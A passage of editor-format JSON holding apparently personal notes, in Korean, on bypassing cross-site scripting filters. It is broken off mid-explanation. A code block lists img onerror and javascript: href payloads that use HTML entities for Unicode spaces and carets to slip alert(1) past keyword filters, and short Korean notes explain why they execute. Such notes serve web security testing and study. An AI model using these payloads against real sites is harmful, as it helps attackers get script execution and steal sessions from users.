      {
        "type": "heading",
        "attrs": {
          "level": 1
        },
        "content": [
          {
            "type": "text",
            "text": "BYPASS"
          }
        ]
      },
      {
        "type": "heading",
        "attrs": {
          "level": 1
        },
        "content": [
          {
            "type": "text",
            "text": "alert( "
          }
        ]
      },
      {
        "type": "codeBlock",
        "attrs": {
          "language": null
        },
        "content": [
          {
            "type": "text",
            "text": "<img src=data: onerror=alert&puncsp;(1)>\n<img src=data: onerror=alert&hairsp;(1)>\n<img src=data: onerror=alert&emsp;(1)>\n<img src=data: onerror=alert&emsp13;(1)>\na href=\"javascript:1&Hat;alert(1)\">test</a>"
          }
        ]
      },
      {
        "type": "paragraph",
        "content": [
          {
            "type": "text",
            "marks": [
              {
                "type": "code"
              }
            ],
            "text": "&puncsp;"
          },
          {
            "type": "text",
            "text": ", "
          },
          {
            "type": "text",
            "marks": [
              {
                "type": "code"
              }
            ],
            "text": "&hairsp;"
          },
          {
            "type": "text",
            "text": ", "
          },
          {
            "type": "text",
            "marks": [
              {
                "type": "code"
              }
            ],
            "text": "&emsp;"
          },
          {
            "type": "text",
            "text": ", "
          },
          {
            "type": "text",
            "marks": [
              {
                "type": "code"
              }
            ],
            "text": "&emsp13;"
          },
          {
            "type": "text",
            "text": " → 각각 다른 유니코드 공백. 따라서 "
          },
          {
            "type": "text",
            "marks": [
              {
                "type": "code"
              }
            ],
            "text": "alert 공백 (1)"
          },
          {
            "type": "text",
            "text": "로 해석되어 호출됩니다."
          }
        ]
      },
      {
        "type": "paragraph",
        "content": [
          {
            "type": "text",
            "marks": [
              {
                "type": "code"
              }
            ],
            "text": "&Hat;"
          },
          {
            "type": "text",
            "text": " → "
          },
          {
            "type": "text",
